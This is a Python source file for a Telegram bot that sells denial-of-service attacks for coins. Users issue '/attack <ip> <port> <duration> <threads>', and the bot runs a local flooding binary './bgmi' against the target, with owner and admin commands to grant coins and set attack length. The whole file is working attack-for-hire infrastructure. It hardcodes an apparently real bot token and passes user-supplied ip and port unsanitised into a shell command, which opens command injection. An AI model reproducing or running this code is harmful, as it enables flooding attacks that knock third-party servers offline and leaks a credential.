import os
import asyncio
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

TELEGRAM_BOT_TOKEN = '7246047709:AAElzJRbgodpAq62ql3aSF2CVXkMbHqdzvA'  # Replace with your bot token
OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @)

user_coins = {}
admins = set()
running_attacks = {}
max_duration = 180  # Default max attack duration (in seconds)

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    keyboard = [["Balance💰"]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration> <threads> *\n\n"
        "*⚔️(Costs 5 coins per attack)⚔️*\n\n"
        "*Check your balance by clicking the button below!*\n\n"
        "*Owners & Admins can add coins using /addcoins <user_id> <amount>*\n\n"
        "*Let the war begin! ⚔️💥*"
    )
    
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown', reply_markup=reply_markup)

async def balance(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    username = update.effective_user.username or "No Username"
    coins = user_coins.get(chat_id, 0)

    message = (
        f"💰 *Your Balance:*\n"
        f"👤 *Username:* {username}\n"
        f"🆔 *User ID:* {chat_id}\n"
        f"💵 *Coins:* {coins}\n\n"
        f"🔹 *For more coins, contact the owner: @{OWNER_USERNAME}*"
    )

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def balance_button(update: Update, context: CallbackContext):
    if update.message.text == "Balance💰":
        await balance(update, context)

async def add_coins(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if update.effective_user.username != OWNER_USERNAME and user_id not in admins:
        await context.bot.send_message(chat_id=chat_id, text="❌ *You are not authorized to use this command!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Usage: /addcoins <user_id> <amount>*", parse_mode='Markdown')
        return

    target_user_id, amount = int(args[0]), int(args[1])
    user_coins[target_user_id] = user_coins.get(target_user_id, 0) + amount
    await context.bot.send_message(chat_id=chat_id, text=f"✅ *Added {amount} coins to user {target_user_id}*")

async def add_admin(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if update.effective_user.username != OWNER_USERNAME:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Only the owner can add admins!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Usage: /addadmin <user_id>*", parse_mode='Markdown')
        return

    admin_id = int(args[0])
    admins.add(admin_id)
    await context.bot.send_message(chat_id=chat_id, text=f"✅ *User {admin_id} is now an admin!*")

async def remove_admin(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if update.effective_user.username != OWNER_USERNAME:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Only the owner can remove admins!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Usage: /removeadmin <user_id>*", parse_mode='Markdown')
        return

    admin_id = int(args[0])
    admins.discard(admin_id)
    await context.bot.send_message(chat_id=chat_id, text=f"✅ *User {admin_id} is no longer an admin!*")

async def set_max_duration(update: Update, context: CallbackContext):
    global max_duration
    chat_id = update.effective_chat.id

    if update.effective_user.username != OWNER_USERNAME:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Only the owner can set max duration!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1 or not args[0].isdigit():
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Usage: /setmaxduration <seconds>*", parse_mode='Markdown')
        return

    max_duration = min(int(args[0]), 3600)  # Limit max duration to 1 hour
    await context.bot.send_message(chat_id=chat_id, text=f"✅ *Max attack duration set to {max_duration} seconds!*")

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if running_attacks.get(chat_id, False):
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Attack is already running. Please wait for it to finish.*", parse_mode='Markdown')
        return

    if user_coins.get(chat_id, 0) < 5:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Not enough coins! You need 5 coins per attack.*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 4:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Usage: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
        return

    ip, port, duration, threads = args
    duration = int(duration)
    threads = int(threads)

    if duration > max_duration:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
        return

    user_coins[chat_id] -= 5
    running_attacks[chat_id] = True

    await context.bot.send_message(chat_id=chat_id, text=( 
        f"⚔️ *Attack Launched! ⚔️*\n"
        f"🎯 *Target: {ip}:{port}*\n"
        f"🕒 *Duration: {duration} sec (Max: {max_duration} sec)*\n"
        f"🧵 *Threads: {threads}*\n"
        f"🔥 *Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, threads, context))

async def run_attack(chat_id, ip, port, duration, threads, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} {threads}",  
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await process.communicate()
    finally:
        running_attacks.pop(chat_id, None)
        await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Completed!*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("balance", balance))
    application.add_handler(CommandHandler("addcoins", add_coins))
    application.add_handler(CommandHandler("addadmin", add_admin))
    application.add_handler(CommandHandler("removeadmin", remove_admin))
    application.add_handler(CommandHandler("setmaxduration", set_max_duration))

    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, balance_button))

    application.run_polling()

if __name__ == '__main__':
    main()
